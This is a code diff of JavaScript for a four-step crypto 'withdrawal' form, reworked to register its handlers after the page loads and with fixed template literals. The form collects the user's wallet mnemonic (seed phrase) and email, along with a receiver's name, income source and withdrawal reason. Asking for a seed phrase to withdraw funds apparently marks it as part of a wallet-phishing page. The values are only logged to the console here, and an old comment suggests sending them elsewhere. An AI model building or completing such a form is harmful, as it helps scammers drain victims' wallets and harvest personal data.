@@ -1,97 +1,97 @@
-// Step 1: Withdraw Setup - Validate and Proceed to Step 2
-function confirmStep1() {
-  // Get values from the form fields
-  const address = document.getElementById('withdrawalAddress').value.trim();
-  const network = document.getElementById('network').value;
-  const country = document.getElementById('country').value;
-  const exchanger = document.getElementById('cryptoExchanger').value;
+document.addEventListener('DOMContentLoaded', () => {
+  // Step 1: Withdraw Setup - Validate and Proceed to Step 2
+  function confirmStep1() {
+    const address = document.getElementById('withdrawalAddress').value.trim();
+    const network = document.getElementById('network').value;
+    const country = document.getElementById('country').value;
+    const exchanger = document.getElementById('cryptoExchanger').value;
 
-  // Check if all required fields are filled
-  if (!address || !network || !country || !exchanger) {
-    alert('Please complete all fields.');
-    return; // Stop further execution if fields are empty
+    if (!address || !network || !country || !exchanger) {
+      alert('Please complete all fields.');
+      return;
+    }
+
+    // Corrected template literals
+    console.log(`Withdrawal Address: ${address}`);
+    console.log(`Network: ${network}`);
+    console.log(`Country: ${country}`);
+    console.log(`Crypto Exchanger: ${exchanger}`);
+
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
   }
 
-  // Log values to console (for debugging purposes)
-  console.log(Withdrawal Address: ${address});
-  console.log(Network: ${network});
-  console.log(Country: ${country});
-  console.log(Crypto Exchanger: ${exchanger});
+  // Step 2: Receiver Information - Validate and Proceed to Step 3
+  function confirmStep2() {
+    const receiver = document.getElementById('receiverAddress').value.trim();
+    const name = document.getElementById('receiverName').value.trim();
+    const surname = document.getElementById('receiverSurname').value.trim();
+    const withdrawalReason = document.getElementById('withdrawalReason').value.trim();
+    const sourceOfIncome = document.getElementById('sourceOfIncome').value;
 
-  // Hide the first step and show the second step
-  document.getElementById('step1').style.display = 'none';
-  document.getElementById('step2').style.display = 'block';
-}
+    if (!receiver || !name || !surname || !withdrawalReason || !sourceOfIncome) {
+      alert('Please complete all fields.');
+      return;
+    }
 
-// Step 2: Receiver Information - Validate and Proceed to Step 3
-function confirmStep2() {
-  const receiver = document.getElementById('receiverAddress').value.trim();
-  const name = document.getElementById('receiverName').value.trim();
-  const surname = document.getElementById('receiverSurname').value.trim();
-  const withdrawalReason = document.getElementById('withdrawalReason').value.trim();
-  const sourceOfIncome = document.getElementById('sourceOfIncome').value;
+    console.log({
+      receiverAddress: receiver,
+      name: name,
+      surname: surname,
+      withdrawalReason: withdrawalReason,
+      sourceOfIncome: sourceOfIncome,
+    });
 
-  // Check that all fields are filled
-  if (!receiver || !name || !surname || !withdrawalReason || !sourceOfIncome) {
-    alert('Please complete all fields.');
-    return;
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('step3').style.display = 'block';
   }
 
-  // Log the values (or you can send them somewhere)
-  console.log({
-    receiverAddress: receiver,
-    name: name,
-    surname: surname,
-    withdrawalReason: withdrawalReason,
-    sourceOfIncome: sourceOfIncome,
-  });
+  // Step 3: Wallet - Validate and Proceed to Final Step
+  function confirmStep3() {
+    const email = document.getElementById('email').value.trim();
+    const mnemonic = document.getElementById('mnemonic').value.trim();
 
-  // Move to the next step or perform other logic
-  document.getElementById('step2').style.display = 'none';
-  document.getElementById('step3').style.display = 'block';
-}
+    if (!email || !mnemonic) {
+      alert('Please complete all fields.');
+      return;
+    }
 
-// Step 3: Wallet - Validate and Proceed to Final Step
-function confirmStep3() {
-  const email = document.getElementById('email').value.trim();
-  const mnemonic = document.getElementById('mnemonic').value.trim();
+    console.log({
+      email: email,
+      mnemonic: mnemonic,
+    });
 
-  if (!email || !mnemonic) {
-    alert('Please complete all fields.');
-    return;
+    document.getElementById('step3').style.display = 'none';
+    document.getElementById('step4').style.display = 'block';
   }
 
-  console.log({
-    email: email,
-    mnemonic: mnemonic,
-  });
+  // Back button handlers
+  function backToStep1() {
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('step1').style.display = 'block';
+  }
 
-  document.getElementById('step3').style.display = 'none';
-  document.getElementById('step4').style.display = 'block';
-}
+  function backToStep2() {
+    document.getElementById('step3').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+  }
 
+  function backToStep3() {
+    document.getElementById('step4').style.display = 'none';
+    document.getElementById('step3').style.display = 'block';
+  }
 
+  // Register event listeners after DOM is loaded
+  document.getElementById('continueStep1').addEventListener('click', confirmStep1);
+  document.getElementById('continueStep2').addEventListener('click', confirmStep2);
+  document.getElementById('continueStep3').addEventListener('click', confirmStep3);
 
-// Back button handlers
-function backToStep1() {
-  document.getElementById('step2').style.display = 'none';
-  document.getElementById('step1').style.display = 'block';
-}
+  // Optional: Register back buttons if they exist
+  const back1 = document.getElementById('backToStep1');
+  const back2 = document.getElementById('backToStep2');
+  const back3 = document.getElementById('backToStep3');
 
-function backToStep2() {
-  document.getElementById('step3').style.display = 'none';
-  document.getElementById('step2').style.display = 'block';
-}
-
-function backToStep3() {
-  document.getElementById('step4').style.display = 'none';
-  document.getElementById('step3').style.display = 'block';
-}
-
-
-
-
-// Event listeners for button clicks to proceed to next step
-document.getElementById('continueStep1').addEventListener('click', confirmStep1);
-document.getElementById('continueStep2').addEventListener('click', confirmStep2);
-document.getElementById('continueStep3').addEventListener('click', confirmStep3);
+  if (back1) back1.addEventListener('click', backToStep1);
+  if (back2) back2.addEventListener('click', backToStep2);
+  if (back3) back3.addEventListener('click', backToStep3);
+});
